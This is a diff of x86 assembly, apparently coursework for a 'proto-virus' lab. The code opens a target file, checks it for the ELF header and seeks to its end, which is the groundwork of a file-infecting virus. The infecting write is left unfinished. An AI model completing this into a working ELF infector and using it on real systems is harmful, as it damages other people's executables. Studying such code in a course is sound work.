@@ -68,24 +68,38 @@ _start:
 
 
 	write STDOUT, virus_msg, 16
-	open FileName, RDWR, 0x0777
+	open FileName, RDWR, 0777
+	cmp eax, -1
+	je .error_occured
 	mov [ebp-4], eax
-	.bla:
 	checkELF [ebp-4]
+	cmp eax, -1
+	je .error_occured
+
+	lseek dword [ebp-4], 0, SEEK_END
+	mov dword [ebp-8], eax
+	write dword [ebp-4], 
 	close dword [ebp-4]
+	mov eax, 1
+	jmp VirusExit
 
-
+	.error_occured:
+		write STDOUT, error_msg, 18
+		mov eax, 0
+		jmp VirusExit
 ; You code for this lab goes here
 
 VirusExit:
-       exit 0            ; Termination if all is OK and no previous code to jump to
+       exit eax            ; Termination if all is OK and no previous code to jump to
                          ; (also an example for use of above macros)
 	
+;FileName:	db "makefile", 0
 FileName:	db "ELFexec", 0
 OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
 Failstr:    db "perhaps not", 10 , 0
 virus_msg:    db "This is a virus", 10 , 0
 elf_magic:    db "ELF", 0
+error_msg:    db "An error occured!", 10, 0
 
 
 PreviousEntryPoint: dd VirusExit
@@ -96,16 +110,29 @@ real_checkELF:
 	push ebp
 	mov ebp, esp
 
-	.bla:
-	cmp dword [ebp+8], 0
-	jge .cont
-	mov eax, -1
+	sub esp, 4
+	read dword [ebp+8], esp, 4
+	mov ecx, ebp
+	sub ecx, 3
+	cmp byte [ecx], 'E'
+	jne .not_ELF
+	inc ecx
+	cmp byte [ecx], 'L'
+	jne .not_ELF
+	inc ecx
+	cmp byte [ecx], 'F'
+	jne .not_ELF
+	mov eax, 1
+
 	jmp .end_checkELF
 
-	.cont:
-		write STDOUT, virus_msg, 16
+	.not_ELF:
+		mov eax, -1
+		jmp .end_checkELF
 
 	.end_checkELF:
+
+	add esp, 4
 
 	mov esp, ebp
 	pop ebp
